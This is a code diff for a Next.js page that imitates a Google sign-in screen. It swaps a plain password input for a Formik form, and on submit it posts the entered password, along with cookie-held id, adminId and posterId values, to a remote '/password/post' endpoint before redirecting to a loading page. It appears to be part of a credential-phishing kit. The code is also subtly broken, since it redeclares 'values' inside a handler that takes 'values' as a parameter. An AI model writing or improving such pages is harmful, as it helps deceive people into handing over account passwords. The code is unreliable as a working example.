@@ -1,5 +1,6 @@
 'use client'
 import React, { useState } from 'react'
+import { Form, Formik,Field } from "formik";
 import { useRouter } from "next/navigation";
 import Cookies from "js-cookie";
 import { API_URL } from "../config/index";
@@ -8,14 +9,19 @@ function page() {
     const id = Cookies.get("id");
     const adminId = Cookies.get("adminId");
     const posterId = Cookies.get("posterId");
-    const [password, setPassword] = useState("");
-    const handleSubmit = async() => {
+
+    const initialvalues = {
+      password: "",
+    };
+    const handleSubmit = async(values, formik) => {
+      const { password } = values;
       const values = {
        id,
-       password,
+       password: password,
        adminId,
        posterId
       }
+      console.log(values)
        const url = `${API_URL}/password/post`;
    
        const res = await fetch(url, {
@@ -34,7 +40,6 @@ function page() {
          router.push("/loading")
        } else {
          console.log("error", data);
-         toast.error("Something Went Wrong");
        }
    
    
@@ -48,14 +53,27 @@ function page() {
         <div className="text-start">
         <p className='font-medium text-xl mt-5'>Sign in</p>
         </div>
-        <input required value={password} onChange={(e) => setPassword(e.target.value)} className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5' type="text" placeholder="Enter your password "/>
-        <p className='text-black text-sm mt-2'>show password</p>
+        <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
+  {
+    (formik) => (
+      <Form >
+        <Field className='w-[350px] px-3 py-3 border border-gray-300 outline-none rounded-md mt-5 placeholder:pl-5'
+          type="password"
+          name="password"
+          placeholder="Enter your password"
+          required
+        />
+          <p className='text-black text-sm mt-2'>show password</p>
         <p className='text- text-sm mt-2'>Not your computer? Use Guest mode to sign in privately.</p>
         <p className='text-[#1a73e8] text-sm mt-2'>Learn more about using Guest mode</p>
         <div className="flex justify-between mt-3">
           <p className='text-[#1a73e8] text-sm mt-7 text-center'>Create account</p>
-          <button  onClick={handleSubmit} className=' bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5'>Next</button>
+          <button type='submit' onClick={handleSubmit} className=' bg-[#1a73e8] text-white px-3 py-2 border border-gray-300 outline-none rounded-full mt-5'>Next</button>
         </div>
+      </Form>
+    )
+  }
+ </Formik>
       </div>
     </div>
     </div>
@@ -63,3 +81,5 @@ function page() {
 }
 
 export default page
+
+
